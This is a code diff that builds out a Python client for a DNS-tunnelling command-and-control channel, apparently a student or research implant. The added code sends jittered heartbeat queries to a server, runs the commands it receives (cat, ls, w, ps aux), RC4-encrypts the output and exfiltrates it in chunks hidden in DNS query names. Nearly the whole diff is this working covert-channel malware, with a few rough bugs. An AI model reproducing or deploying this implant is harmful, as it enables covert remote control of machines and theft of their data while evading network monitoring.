@@ -1,6 +1,15 @@
+import base64
+import math
+import random
+import subprocess
+import time
+from arc4 import ARC4
 from argparse import ArgumentParser
+from typing import Tuple, Optional
+
 import dns.resolver
-import sys
+
+from shared import serv_to_client, client_to_serv
 
 
 class Client:
@@ -9,6 +18,11 @@ class Client:
         self.silent = args.silent
         self.server_port = args.port
         self.server_ip = args.destination
+
+        self.idle_timing = [20, 100]
+        self.sending_timing = [2, 5]
+        self.sending_data = False
+        self.curr_seg_to_send = 0
 
         self.__log("Initializing...")
 
@@ -20,42 +34,152 @@ class Client:
 
         self.running = False
 
-    def __del__(self):
-        self.__log("Closing...")
-
     def __log(self, message):
         if self.silent:
             return
-        print("CC: {}".format(message))
+        print("CCC: {}".format(message))
 
-    def server_reachable(self):
+    def server_registration(self):
         """
         Initializes communication with the server.
         """
 
-        try:
-            # Initialize by sending a regular google.com request to the server:
-            answer = self.sender.query("google.com", "A")
-
-            if not answer.response.answer[0].items[0].address == "1.2.3.4":
-                return False
-
-            # If we get 1.2.3.4 as an answer, we should start sending hearthbeats.
-            return True
-        except Exception:
+        answer, arg = self.hb()
+        if answer is None:
             return False
+        return answer == serv_to_client["ACK"]
+
+    def do_sleep(self):
+        if self.sending_data:
+            minim, maxim = self.sending_timing
+        else:
+            minim, maxim = self.idle_timing
+
+        ran = random.gauss((maxim + minim) / 2, math.sqrt(maxim - minim))
+        time.sleep(max(minim, min(maxim, ran)))
+
+    def hb(self) -> Optional[Tuple[str, str]]:
+        try:
+            answer = self.sender.query(client_to_serv["HB"], "A")
+            return answer.response.answer[0].items[0].address, ""  # TODO: ARG?????????????????????????
+        except Exception:
+            return None
+
+    def do_send_hb(self):
+        self.__log("HB")
+        answer, arg = self.hb()
+        if answer == serv_to_client["NOP"]:
+            self.__log("NOP")
+            return
+
+        elif answer == serv_to_client["SD"]:
+            self.__log("Server sent SD signal! Shutting down...")
+            self.stop()
+
+        self.carry_out_command(answer, arg)
+
+    def carry_out_command(self, command, arg):
+        self.__log("Carrying out command: {}, with args: {}".format(command, arg))
+        if command == serv_to_client["CAT"]:
+            output = subprocess.check_output("cat", arg)
+        elif command == serv_to_client["LS"]:
+            output = subprocess.check_output("ls", arg)
+        elif command == serv_to_client["W"]:
+            output = subprocess.check_output(['w'])
+        elif command == serv_to_client["PS"]:
+            output = subprocess.check_output(['ps', 'aux'])
+
+        else:
+            self.__log("Unknown command: {}".format(command))
+            return
+
+        data = self.encrypt(output)
+        segments = self.to_segments(data)
+        segments.reverse()
+        self.segments_to_send = segments
+        self.curr_seg_to_send = 0
+        self.sending_data = True
+
+    def to_segments(self, data):
+        domain_len = len(client_to_serv["RESP"]) + 2
+        max_len = 250 - domain_len  # DNS has max of 256 bytes
+        max_size_of_part = int(min(max_len / 3, 63))
+        part_count = math.ceil(len(data) / max_size_of_part)
+        segment_count = math.ceil(part_count / 3)
+
+        self.__log(
+            "Total response length is: {}, while we can fit at most {} per part, which means {} per segment. Total segments: {}".format(
+                len(data), max_size_of_part, 3 * max_size_of_part, segment_count))
+
+        parts = [data[i:i + max_size_of_part] for i in range(0, len(data), max_size_of_part)]
+        segments = ["{}.{}.{}.{}".format(parts[3 * i], parts[3 * i + 1], parts[3 * i + 2], client_to_serv["RESP"]) for i
+                    in range(0, len(parts) // 3)]
+        last_seg = ""
+        for i in range(len(parts) // 3, len(parts)):
+            last_seg += "{}.".format(parts[i])
+        last_seg += client_to_serv["RESP"]
+        segments.append(last_seg)
+
+        return segments
+
+    def encrypt(self, data: str):
+        cipher = ARC4(self.password).encrypt(bytes(data, "utf-8"))
+        encoded = base64.b64encode(cipher)
+        return encoded.replace(b"=", "").replace(b"/", b"_").replace(b"+", b"-")
+
+    def eos(self):
+        self.__log("Sending EOS signal...")
+        try:
+            answer = self.sender.query(client_to_serv["DONE"], "A")
+            return answer.response.answer[0].items[0].address
+        except Exception:
+            return None
+
+    def do_sending_data(self):
+
+        if self.curr_seg_to_send == len(self.segments_to_send):
+            # Send the end of stream notification:
+            ret = self.eos()
+            if ret == serv_to_client["ACK"]:
+                self.sending_data = False
+            else:
+                self.__log("Something went wrong! Start sending again!")
+                self.curr_seg_to_send = 0
+            return
+
+        # Send next segment
+        ret = self.resp()
+        if ret == serv_to_client["ACK"]:
+            self.curr_seg_to_send += 1
+
+    def resp(self):
+        self.__log("Sending RESP no:{}".format(self.curr_seg_to_send))
+        try:
+            answer = self.sender.query(self.segments_to_send[self.curr_seg_to_send], "A")
+            return answer.response.answer[0].items[0].address
+        except Exception:
+            return None
 
     def run(self):
         if self.running:
             return
         self.running = True
 
-        if not self.server_reachable():
-            self.__log("Server does not seem to be reachable. Stopping...")
-            self.running = False
+        # Register with the server:
+        if not self.server_registration():
+            self.__log("We got an invalid response for our initial heartbeat! Shutting down...")
+            self.stop()
+            return
 
-        self.__log("Server is reachable, all is fine and dandy.")
-        # TODO:
+        # Initialized correctly..  Start sending heartbeat
+        while self.running:
+            self.do_sleep()
+            self.__log("Tick")
+            if self.sending_data:
+                self.do_sending_data()
+            else:
+                self.do_send_hb()
+
 
     def stop(self):
         if not self.running:
